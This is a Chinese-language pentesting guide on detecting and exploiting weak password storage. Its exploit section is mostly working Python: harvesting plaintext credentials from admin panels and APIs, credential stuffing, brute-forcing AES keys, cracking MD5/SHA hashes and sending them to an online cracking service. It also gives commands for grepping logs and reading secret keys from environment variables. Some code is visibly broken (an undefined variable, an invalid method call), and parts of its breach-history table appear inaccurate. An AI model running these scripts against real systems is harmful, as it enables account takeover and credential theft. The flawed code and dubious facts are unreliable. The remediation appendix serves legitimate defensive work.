# 弱密码存储检测方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的弱密码存储检测和利用流程。密码存储安全是认证系统的核心，不当的密码存储方式（明文、弱哈希、可逆加密）会导致严重的凭证泄露风险。本文档帮助测试人员系统性地识别密码存储漏洞，并提供相应的攻击利用方法。

## 1.2 适用范围

本文档适用于所有存在用户认证的系统，包括：
- Web 应用用户认证
- API 认证系统
- 移动应用后端
- 企业内部系统
- 数据库用户存储

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责认证系统设计和开发的安全开发人员。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

弱密码存储是指系统以不安全的方式存储用户密码，包括：
- **明文存储**：密码未经任何处理直接存储
- **可逆加密**：使用可解密的加密算法（如 AES、DES）
- **弱哈希算法**：使用已破解或不安全的哈希算法（如 MD5、SHA1）
- **无盐哈希**：哈希时未使用随机盐值
- **硬编码密钥**：加密密钥硬编码在代码中

**本质问题**：
- 违反密码存储最佳实践
- 数据库泄露导致密码直接暴露
- 加密密钥泄露导致密码可被解密
- 弱哈希可被彩虹表或暴力破解

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-256 | 明文存储密码 (Plaintext Storage of a Password) |
| CWE-257 | 可逆存储密码 (Storable Password) |
| CWE-311 | 缺少加密存储 (Missing Encryption of Sensitive Data) |
| CWE-328 | 使用弱哈希算法 (Reversible One-Way Hash) |
| CWE-329 | 哈希时未使用不可预测的盐值 (Not Using an Unpredictable Salt) |
| CWE-798 | 使用硬编码凭证 (Use of Hard-coded Credentials) |
| CWE-1392 | 使用默认凭证 (Use of Default Credentials) |

### 密码存储安全等级

| 等级 | 存储方式 | 风险等级 | 说明 |
|-----|---------|---------|------|
| 0 | 明文 | 严重 | 密码直接暴露 |
| 1 | Base64 编码 | 严重 | 等同于明文 |
| 2 | 可逆加密（AES/DES） | 严重 | 密钥泄露即可解密 |
| 3 | MD5 哈希 | 高 | 可被彩虹表破解 |
| 4 | SHA1 哈希 | 高 | 已证明不安全 |
| 5 | 无盐 SHA256 | 中 - 高 | 可被彩虹表攻击 |
| 6 | 加盐 SHA256 | 中 | 盐值泄露可降低安全性 |
| 7 | bcrypt | 低 | 推荐，计算成本高 |
| 8 | Argon2 | 低 | 最推荐，抗 GPU 攻击 |
| 9 | scrypt | 低 | 推荐，内存密集 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 用户注册 | 创建账户 | 密码可能明文存储 |
| 密码修改 | 更改密码 | 新密码可能明文存储 |
| 密码重置 | 忘记密码 | 临时密码可能明文传输 |
| 用户管理 | 管理员查看用户 | 密码可能对管理员可见 |
| 数据导出 | 导出用户数据 | 导出文件可能包含明文密码 |
| 日志记录 | 认证日志 | 密码可能被记录到日志 |
| 数据库备份 | 备份文件 | 备份可能未加密 |
| API 调试 | 调试模式 | 请求/响应可能记录密码 |

### 历史数据泄露案例

| 公司 | 年份 | 泄露数量 | 存储方式 | 影响 |
|-----|------|---------|---------|------|
| LinkedIn | 2012 | 1.64 亿 | 无盐 SHA1 | 大规模凭证填充 |
| Adobe | 2013 | 1.53 亿 | 可逆加密 (3DES) | 密码被批量解密 |
| Yahoo | 2014 | 5 亿 | 弱哈希 (bcrypt 前) | 大规模账户沦陷 |
| Facebook | 2019 | 6 亿 | 明文日志 | 内部滥用风险 |
| Twitter | 2022 | 540 万 | 明文/弱哈希 | 凭证填充攻击 |

## 2.3 漏洞发现方法

### 2.3.1 黑盒检测方法

**密码重置流程检测**：

```bash
# 1. 请求密码重置
curl -X POST https://target.com/forgot-password \
    -d "email=user@example.com"

# 2. 获取重置后的临时密码
# 如果收到明文密码，可能存在存储问题

# 3. 使用临时密码登录后立即改密
# 如果原密码仍可使用，可能是可逆加密
```

**管理员界面检测**：

```bash
# 1. 以管理员身份登录
# 2. 访问用户管理页面
curl -b admin_cookie https://target.com/admin/users

# 3. 查看用户详情
curl -b admin_cookie https://target.com/admin/users/123

# 如果密码可见或可编辑（非重置），可能存储不当
```

**API 响应检测**：

```bash
# 1. 拦截登录响应
curl -X POST https://target.com/api/login \
    -d "username=test&password=test"

# 2. 检查响应中是否包含密码相关信息
# 如 password_hash、encrypted_password 等字段
```

### 2.3.2 白盒检测方法

**源码审计要点**：

```python
# ❌ 危险模式：明文存储
def register_user(username, password):
    db.execute("INSERT INTO users (username, password) VALUES (?, ?)", 
               (username, password))  # 明文密码！

# ❌ 危险模式：Base64 编码
import base64
def hash_password(password):
    return base64.b64encode(password.encode())  # 不是哈希！

# ❌ 危险模式：可逆加密
from Crypto.Cipher import AES
def encrypt_password(password):
    cipher = AES.new(SECRET_KEY, AES.MODE_ECB)  # 可解密！
    return cipher.encrypt(password.pad())

# ❌ 危险模式：弱哈希
import hashlib
def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()  # MD5 已破解！

# ❌ 危险模式：无盐哈希
import hashlib
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()  # 无盐！

# ✅ 正确模式：bcrypt
import bcrypt
def hash_password(password):
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt)

# ✅ 正确模式：Argon2
from argon2 import PasswordHasher
ph = PasswordHasher()
hashed = ph.hash(password)
```

**数据库模式检测**：

```sql
-- 检查密码字段长度
-- 明文/加密：通常较短（<64 字符）
-- MD5: 32 字符
-- SHA1: 40 字符
-- SHA256: 64 字符
-- bcrypt: 60 字符 ($2a$12$...)
-- Argon2: 96+ 字符 ($argon2id$...)

SELECT username, password, LENGTH(password) as pwd_length 
FROM users 
LIMIT 10;

-- 检查是否有盐值字段
SHOW COLUMNS FROM users LIKE '%salt%';

-- 检查密码模式
SELECT DISTINCT SUBSTRING(password, 1, 10) as pwd_prefix 
FROM users 
LIMIT 20;
```

### 2.3.3 自动化检测脚本

```python
#!/usr/bin/env python3
"""
密码存储安全检测脚本
分析密码哈希格式和强度
"""

import re
import hashlib
import requests

class PasswordStorageAnalyzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.test_password = "TestP@ssw0rd123!"
        self.hashes = []
    
    def detect_hash_format(self, hash_string):
        """检测哈希格式"""
        if not hash_string:
            return "Unknown"
        
        # bcrypt
        if hash_string.startswith('$2a$') or hash_string.startswith('$2b$') or \
           hash_string.startswith('$2y$'):
            return "bcrypt"
        
        # Argon2
        if hash_string.startswith('$argon2'):
            return "Argon2"
        
        # scrypt
        if hash_string.startswith('$s$'):
            return "scrypt"
        
        # PBKDF2
        if hash_string.startswith('$pbkdf2'):
            return "PBKDF2"
        
        # MD5 (32 字符十六进制)
        if re.match(r'^[a-f0-9]{32}$', hash_string, re.I):
            return "MD5"
        
        # SHA1 (40 字符十六进制)
        if re.match(r'^[a-f0-9]{40}$', hash_string, re.I):
            return "SHA1"
        
        # SHA256 (64 字符十六进制)
        if re.match(r'^[a-f0-9]{64}$', hash_string, re.I):
            return "SHA256"
        
        # Base64
        if re.match(r'^[A-Za-z0-9+/]+=*$', hash_string):
            try:
                import base64
                decoded = base64.b64decode(hash_string)
                if decoded.isascii():
                    return "Base64 Encoded"
            except:
                pass
        
        # 明文检测
        if len(hash_string) < 20 and hash_string.isprintable():
            return "Possible Plaintext"
        
        return "Unknown Format"
    
    def test_registration_hash(self):
        """测试注册时的密码存储"""
        print("[*] Testing registration password storage...")
        
        test_user = f"testuser_{hashlib.md5(str(hash(time.time())).encode()).hexdigest()[:8]}"
        
        try:
            # 注册测试用户
            response = requests.post(f"{self.target_url}/register", data={
                'username': test_user,
                'password': self.test_password,
                'email': f"{test_user}@test.com"
            })
            
            if 'success' in response.text.lower():
                print(f"[+] Registration successful for {test_user}")
                # 如果有管理员权限，可以查询存储的哈希
                return True
            else:
                print("[-] Registration failed")
                return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def analyze_database_dump(self, db_file):
        """分析数据库转储文件"""
        print(f"[*] Analyzing database dump: {db_file}")
        
        hash_formats = {}
        plaintext_count = 0
        
        try:
            with open(db_file, 'r') as f:
                for line in f:
                    if ':' in line:
                        parts = line.strip().split(':')
                        if len(parts) >= 2:
                            password_field = parts[-1]  # 假设密码在最后
                            fmt = self.detect_hash_format(password_field)
                            hash_formats[fmt] = hash_formats.get(fmt, 0) + 1
                            
                            if fmt == "Possible Plaintext":
                                plaintext_count += 1
                                print(f"[CRITICAL] Possible plaintext: {parts[0]}:{password_field[:20]}...")
            
            print("\n[*] Hash Format Distribution:")
            for fmt, count in sorted(hash_formats.items(), key=lambda x: x[1], reverse=True):
                percentage = (count / sum(hash_formats.values())) * 100
                print(f"  {fmt}: {count} ({percentage:.1f}%)")
            
            if plaintext_count > 0:
                print(f"\n[CRITICAL] {plaintext_count} passwords stored in plaintext!")
            
            return hash_formats
        except Exception as e:
            print(f"[-] Error analyzing database: {e}")
            return None
    
    def test_common_hash_weaknesses(self, hash_string, original_password=None):
        """测试常见哈希弱点"""
        if not hash_string:
            return
        
        print(f"[*] Testing hash weaknesses for: {hash_string[:20]}...")
        
        # MD5 彩虹表测试
        if self.detect_hash_format(hash_string) == "MD5":
            # 测试常见密码
            common_passwords = ['123456', 'password', '12345678', 'qwerty', 'abc123']
            for pwd in common_passwords:
                if hashlib.md5(pwd.encode()).hexdigest() == hash_string:
                    print(f"[CRITICAL] MD5 hash cracked! Password: {pwd}")
                    return pwd
        
        # SHA1 彩虹表测试
        if self.detect_hash_format(hash_string) == "SHA1":
            common_passwords = ['123456', 'password', '12345678', 'qwerty']
            for pwd in common_passwords:
                if hashlib.sha1(pwd.encode()).hexdigest() == hash_string:
                    print(f"[CRITICAL] SHA1 hash cracked! Password: {pwd}")
                    return pwd
        
        print("[-] Common password test failed")
        return None
    
    def generate_report(self, hash_formats=None):
        """生成密码存储安全报告"""
        print("\n" + "="*60)
        print("Password Storage Security Report")
        print("="*60)
        
        if hash_formats:
            secure_formats = ['bcrypt', 'Argon2', 'scrypt', 'PBKDF2']
            insecure_formats = ['MD5', 'SHA1', 'SHA256', 'Base64 Encoded', 'Possible Plaintext']
            
            secure_count = sum(hash_formats.get(fmt, 0) for fmt in secure_formats)
            insecure_count = sum(hash_formats.get(fmt, 0) for fmt in insecure_formats)
            
            total = secure_count + insecure_count
            
            if total > 0:
                secure_percentage = (secure_count / total) * 100
                
                print(f"Secure hashes: {secure_count} ({secure_percentage:.1f}%)")
                print(f"Insecure hashes: {insecure_count} ({100-secure_percentage:.1f}%)")
                
                if insecure_percentage > 0:
                    print("\n[WARNING] Insecure password storage detected!")
                    print("Recommendation: Migrate to bcrypt or Argon2")
                else:
                    print("\n[PASS] Password storage appears secure")
        else:
            print("[INFO] No data to analyze")

if __name__ == '__main__':
    import sys
    import time
    
    if len(sys.argv) > 1:
        analyzer = PasswordStorageAnalyzer(sys.argv[1])
        
        # 如果有数据库转储文件
        if len(sys.argv) > 2:
            formats = analyzer.analyze_database_dump(sys.argv[2])
            analyzer.generate_report(formats)
        else:
            analyzer.test_registration_hash()
    else:
        print("Usage: python pwd_storage_analyzer.py <target_url> [db_dump_file]")
```

## 2.4 漏洞利用方法

### 2.4.1 明文密码利用

```python
#!/usr/bin/env python3
"""
明文密码存储利用脚本
"""

import requests
import json

class PlaintextPasswordExploiter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.credentials = []
    
    def extract_from_admin_panel(self, admin_session):
        """从管理员面板提取明文密码"""
        print("[*] Extracting passwords from admin panel...")
        
        session = requests.Session()
        session.cookies.update(admin_session)
        
        try:
            # 访问用户列表
            response = session.get(f"{self.target_url}/admin/users")
            
            # 解析用户数据（假设是 JSON 或 HTML）
            if 'application/json' in response.headers.get('Content-Type', ''):
                users = response.json()
                for user in users:
                    if 'password' in user:
                        self.credentials.append({
                            'username': user.get('username'),
                            'password': user.get('password')
                        })
                        print(f"[+] Found: {user.get('username')}:{user.get('password')[:20]}...")
            else:
                # HTML 解析逻辑
                print("[*] HTML parsing not implemented in this example")
        
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def extract_from_api(self):
        """从 API 端点提取明文密码"""
        print("[*] Extracting passwords from API...")
        
        endpoints = [
            '/api/users',
            '/api/v1/users',
            '/api/v2/users',
            '/graphql'
        ]
        
        for endpoint in endpoints:
            try:
                response = requests.get(f"{self.target_url}{endpoint}")
                if response.status_code == 200:
                    data = response.json()
                    # 递归查找密码字段
                    self._find_passwords(data, endpoint)
            except:
                pass
    
    def _find_passwords(self, data, path, depth=0):
        """递归查找密码字段"""
        if depth > 5:
            return
        
        if isinstance(data, dict):
            for key, value in data.items():
                if 'password' in key.lower():
                    print(f"[+] Found at {path}.{key}: {str(value)[:20]}...")
                    self.credentials.append({'path': f"{path}.{key}", 'value': str(value)})
                else:
                    self._find_passwords(value, f"{path}.{key}", depth + 1)
        elif isinstance(data, list):
            for i, item in enumerate(data):
                self._find_passwords(item, f"{path}[{i}]", depth + 1)
    
    def credential_stuffing(self, login_url):
        """使用提取的凭证进行填充攻击"""
        print(f"[*] Starting credential stuffing against {login_url}...")
        
        successful = []
        
        for cred in self.credentials:
            try:
                response = requests.post(login_url, data={
                    'username': cred.get('username'),
                    'password': cred.get('password')
                })
                
                if 'success' in response.text.lower() or response.status_code == 302:
                    print(f"[SUCCESS] {cred.get('username')}:{cred.get('password')}")
                    successful.append(cred)
            except Exception as e:
                pass
        
        print(f"\n[+] Successful logins: {len(successful)}")
        return successful
    
    def save_credentials(self, output_file):
        """保存凭证到文件"""
        with open(output_file, 'w') as f:
            for cred in self.credentials:
                if 'username' in cred and 'password' in cred:
                    f.write(f"{cred['username']}:{cred['password']}\n")
        print(f"[+] Credentials saved to {output_file}")

if __name__ == '__main__':
    exploiter = PlaintextPasswordExploiter('https://target.com')
    # exploiter.extract_from_admin_panel(admin_cookies)
    # exploiter.extract_from_api()
    # exploiter.credential_stuffing('https://target.com/login')
```

### 2.4.2 可逆加密密码解密

```python
#!/usr/bin/env python3
"""
可逆加密密码解密脚本
针对 AES、DES 等可逆加密
"""

from Crypto.Cipher import AES, DES, DES3
import base64
import hashlib

class ReversibleEncryptionCracker:
    def __init__(self):
        self.common_keys = [
            'secret', 'password', 'key123', 'encryption_key',
            'your_secret_key', 'SECRET_KEY', '1234567890123456',
            'admin123', 'test1234', 'changeme', 'default'
        ]
    
    def detect_encryption_type(self, ciphertext):
        """检测加密类型"""
        try:
            # 尝试 Base64 解码
            decoded = base64.b64decode(ciphertext)
            
            # 根据长度判断
            if len(decoded) % 16 == 0:
                return "AES"
            elif len(decoded) % 8 == 0:
                return "DES"
            else:
                return "Unknown"
        except:
            return "Not Base64"
    
    def try_aes_decrypt(self, ciphertext, key):
        """尝试 AES 解密"""
        try:
            # 确保密钥长度正确
            key_bytes = key.encode() if isinstance(key, str) else key
            if len(key_bytes) < 16:
                key_bytes = key_bytes.ljust(16, b'\0')
            elif len(key_bytes) > 16:
                key_bytes = hashlib.md5(key_bytes).digest()
            
            cipher = AES.new(key_bytes, AES.MODE_ECB)
            decoded = base64.b64decode(ciphertext)
            decrypted = cipher.decrypt(decoded)
            
            # 检查是否是可打印字符（可能是密码）
            if all(32 <= b < 127 or b in [9, 10, 13] for b in decrypted):
                return decrypted.decode('utf-8', errors='ignore').strip('\0')
        except:
            pass
        return None
    
    def crack_encrypted_password(self, ciphertext):
        """破解加密密码"""
        print(f"[*] Attempting to crack: {ciphertext[:30]}...")
        
        enc_type = self.detect_encryption_type(ciphertext)
        print(f"[*] Detected encryption type: {enc_type}")
        
        if enc_type == "AES":
            for key in self.common_keys:
                result = self.try_aes_decrypt(ciphertext, key)
                if result:
                    print(f"[SUCCESS] Decrypted with key '{key}': {result}")
                    return result, key
        
        print("[-] Cracking failed with common keys")
        return None, None
    
    def batch_crack(self, encrypted_passwords_file):
        """批量破解加密密码"""
        print(f"[*] Batch cracking from {encrypted_passwords_file}")
        
        cracked = []
        
        with open(encrypted_passwords_file, 'r') as f:
            for line in f:
                if ':' in line:
                    username, ciphertext = line.strip().split(':', 1)
                    password, key = self.crack_encrypted_password(ciphertext)
                    if password:
                        cracked.append({
                            'username': username,
                            'password': password,
                            'key': key
                        })
        
        print(f"\n[+] Total cracked: {len(cracked)}")
        return cracked

if __name__ == '__main__':
    cracker = ReversibleEncryptionCracker()
    
    # 示例：破解单个加密密码
    # encrypted = "U2FsdGVkX1+..."  # Base64 编码的密文
    # password, key = cracker.crack_encrypted_password(encrypted)
```

### 2.4.3 弱哈希密码破解

```python
#!/usr/bin/env python3
"""
弱哈希密码破解脚本
针对 MD5、SHA1、无盐 SHA256
"""

import hashlib
import requests

class WeakHashCracker:
    def __init__(self):
        self.common_passwords = []
        self.load_common_passwords()
    
    def load_common_passwords(self):
        """加载常见密码列表"""
        # 内置常见密码
        self.common_passwords = [
            '123456', 'password', '12345678', 'qwerty', 'abc123',
            'monkey', '1234567', 'letmein', 'trustno1', 'dragon',
            'baseball', 'iloveyou', 'master', 'sunshine', 'ashley',
            'bailey', 'passw0rd', 'shadow', '123123', '654321',
            'Password1', 'Admin123', 'Welcome1', 'Summer2025', 'Winter2025'
        ]
    
    def load_wordlist(self, wordlist_file):
        """加载字典文件"""
        try:
            with open(wordlist_file, 'r') as f:
                self.common_passwords = [line.strip() for line in f]
            print(f"[+] Loaded {len(self.common_passwords)} passwords from wordlist")
        except Exception as e:
            print(f"[-] Error loading wordlist: {e}")
    
    def crack_md5(self, hash_string):
        """破解 MD5 哈希"""
        for password in self.common_passwords:
            if hashlib.md5(password.encode()).hexdigest() == hash_string:
                return password
        return None
    
    def crack_sha1(self, hash_string):
        """破解 SHA1 哈希"""
        for password in self.common_passwords:
            if hashlib.sha1(password.encode()).hexdigest() == hash_string:
                return password
        return None
    
    def crack_sha256(self, hash_string):
        """破解无盐 SHA256 哈希"""
        for password in self.common_passwords:
            if hashlib.sha256(password.encode()).hexdigest() == hash_string:
                return password
        return None
    
    def crack_hash(self, hash_string, hash_type=None):
        """自动检测并破解哈希"""
        if not hash_type:
            # 自动检测
            if len(hash_string) == 32:
                hash_type = 'md5'
            elif len(hash_string) == 40:
                hash_type = 'sha1'
            elif len(hash_string) == 64:
                hash_type = 'sha256'
            else:
                print(f"[-] Unknown hash type for: {hash_string}")
                return None
        
        print(f"[*] Cracking {hash_type} hash: {hash_string[:20]}...")
        
        if hash_type.lower() == 'md5':
            result = self.crack_md5(hash_string)
        elif hash_type.lower() == 'sha1':
            result = self.crack_sha1(hash_string)
        elif hash_type.lower() == 'sha256':
            result = self.crack_sha256(hash_string)
        else:
            result = None
        
        if result:
            print(f"[SUCCESS] Cracked: {result}")
        else:
            print(f"[-] Failed to crack")
        
        return result
    
    def online_crack(self, hash_string):
        """使用在线服务破解"""
        print(f"[*] Trying online crack services...")
        
        # MD5 在线解密
        if len(hash_string) == 32:
            services = [
                f"https://md5decrypt.net/Api/api.php?hash={hash_string}&hash_type=md5&code=123456789",
                f"https://api.md5decrypt.net/{hash_string}"
            ]
            
            for url in services:
                try:
                    response = requests.get(url, timeout=5)
                    if response.text and len(response.text) > 0:
                        print(f"[ONLINE] Cracked via {url}: {response.text}")
                        return response.text.strip()
                except:
                    pass
        
        return None
    
    def batch_crack(self, hashes_file, hash_type='md5'):
        """批量破解哈希"""
        print(f"[*] Batch cracking from {hashes_file}")
        
        cracked = {}
        
        with open(hashes_file, 'r') as f:
            for line in f:
                if ':' in line:
                    username, hash_string = line.strip().split(':', 1)
                    password = self.crack_hash(hash_string, hash_type)
                    if password:
                        cracked[username] = password
        
        print(f"\n[+] Total cracked: {len(cracked)}")
        return cracked

if __name__ == '__main__':
    cracker = WeakHashCracker()
    
    # 破解单个哈希
    # cracker.crack_hash('5f4dcc3b5aa765d61d8327deb882cf99', 'md5')
    
    # 加载字典文件
    # cracker.load_wordlist('rockyou.txt')
    
    # 批量破解
    # cracker.batch_crack('md5_hashes.txt', 'md5')
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过密码查看权限

```python
# 如果密码对管理员隐藏，尝试以下方法

# 1. 直接访问 API 端点
curl -b admin_cookie https://target.com/api/admin/users?include=passwords=true

# 2. 修改响应包（如果前端隐藏）
# 在 Burp Suite 中修改响应，移除隐藏逻辑

# 3. 访问数据库备份/导出
# /backup/users.sql
# /export/users.csv
# /dump/database.sql
```

### 2.5.2 绕过加密保护

```python
# 如果密钥不在代码中，尝试以下方法

# 1. 检查配置文件
# config.py, settings.py, .env, config.json

# 2. 检查环境变量
import os
print(os.environ.get('SECRET_KEY'))
print(os.environ.get('ENCRYPTION_KEY'))

# 3. 检查数据库连接字符串
# 密钥可能存储在数据库中
```

### 2.5.3 日志文件密码提取

```bash
# 搜索日志文件中的密码
grep -r "password" /var/log/
grep -r "passwd" /var/log/

# 搜索应用日志
grep -i "password=" /app/logs/*.log

# 搜索调试输出
grep -i "pwd" /app/logs/debug.log
```

---

# 第三部分：附录

## 3.1 密码存储安全检查清单

| 检查项 | 测试方法 | 安全要求 |
|-------|---------|---------|
| 明文存储 | 查看数据库/响应 | 绝不应明文存储 |
| Base64 编码 | 尝试解码 | 不应仅编码 |
| 可逆加密 | 检查加密算法 | 应使用不可逆哈希 |
| MD5 哈希 | 检查哈希格式 | 应使用 bcrypt/Argon2 |
| SHA1 哈希 | 检查哈希格式 | 应使用 bcrypt/Argon2 |
| 无盐哈希 | 检查相同密码哈希 | 应使用随机盐 |
| 盐值管理 | 检查盐值存储 | 每用户唯一随机盐 |
| 哈希算法 | 检查算法配置 | bcrypt/Argon2/scrypt |

## 3.2 密码哈希识别速查表

| 哈希类型 | 长度 | 前缀特征 | 安全性 |
|---------|------|---------|-------|
| MD5 | 32 | 无 | 已破解 |
| SHA1 | 40 | 无 | 不安全 |
| SHA256 | 64 | 无 | 中等（无盐） |
| bcrypt | 60 | $2a$/$2b$/$2y$ | 推荐 |
| Argon2 | 96+ | $argon2id$ | 最推荐 |
| scrypt | 128+ | $s$ | 推荐 |
| PBKDF2 | 可变 | $pbkdf2$ | 推荐 |

## 3.3 修复建议

### 立即修复（严重风险）

1. **明文存储** - 立即迁移到 bcrypt 或 Argon2
2. **可逆加密** - 改为不可逆哈希
3. **MD5/SHA1** - 迁移到 bcrypt 或 Argon2

### 短期修复（高风险）

1. **无盐哈希** - 添加随机盐值
2. **弱盐值** - 使用加密安全的随机盐（16+ 字节）
3. **低迭代次数** - 增加 bcrypt cost 或 PBKDF2 迭代次数

### 长期修复（最佳实践）

1. **使用 Argon2** - 最现代的密码哈希算法
2. **自适应哈希** - 随硬件升级增加计算成本
3. **密码策略** - 强制强密码，阻止常见密码
4. **泄露检测** - 对照泄露密码库检查用户密码

## 3.4 参考资源

- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [NIST SP 800-63B Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [Have I Been Pwned - Pwned Passwords](https://haveibeenpwned.com/Passwords)
- [bcrypt npm/PyPI 文档](https://www.npmjs.com/package/bcrypt)
- [Argon2 RFC 9106](https://www.rfc-editor.org/rfc/rfc9106.html)
